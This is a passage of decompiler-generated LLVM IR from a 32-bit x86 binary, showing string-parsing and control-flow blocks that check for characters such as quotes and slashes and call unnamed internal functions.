  %v4_80499ab = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_8051d40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00185 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00185, i1* %zf.global-to-local, align 1
  %v2_8049a03187 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03187, align 4
  %v2_8049a05188 = call i32 @function_80524a2(i32* %v1_80484ea)
  store i32 %v2_8049a05188, i32* %eax.global-to-local, align 4
  %v0_8049a0a189 = load i32, i32* @esp, align 4
  %v1_8049a0a190 = add i32 %v0_8049a0a189, 16
  %v1_8049a0d191 = load i32, i32* @ebx, align 4
  %v7_8049a0d192 = icmp ult i32 %v2_8049a05188, %v1_8049a0d191
  %v12_8049a0d193 = icmp eq i32 %v2_8049a05188, %v1_8049a0d191
  store i1 %v12_8049a0d193, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d192, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a194 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a189, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a194, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a194 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8053d90(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_80524a2(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a190, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b0b.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b04.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_8051cf0()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8054b15.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8051fb0()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_80528ae()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_8052743(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76171 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76171, i32* %ecx.global-to-local, align 4
  %v2_8049b79172 = add i32 %v0_8049b54, 20916
  %v3_8049b79173 = inttoptr i32 %v2_8049b79172 to i32*
  store i32 1, i32* %v3_8049b79173, align 4
  %v0_8049b80174 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80175 = inttoptr i32 %v0_8049b80174 to i8*
  %v2_8049b80176 = load i8, i8* %v1_8049b80175, align 1
  %v3_8049b80177 = zext i8 %v2_8049b80176 to i32
  %v4_8049b80178 = load i32, i32* @edx, align 4
  %v5_8049b80179 = and i32 %v4_8049b80178, -256
  %v6_8049b80180 = or i32 %v5_8049b80179, %v3_8049b80177
  store i32 %v6_8049b80180, i32* %edx.global-to-local, align 4
  %v4_8049b82181 = icmp eq i8 %v2_8049b80176, 0
  store i1 %v4_8049b82181, i1* %zf.global-to-local, align 1
  %v1_8049b84182 = icmp eq i1 %v4_8049b82181, false
  br i1 %v1_8049b84182, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80184 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80176, %dec_label_pc_8049b65 ]
  %v0_8049b80183 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80174, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80184, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp147 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp147, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
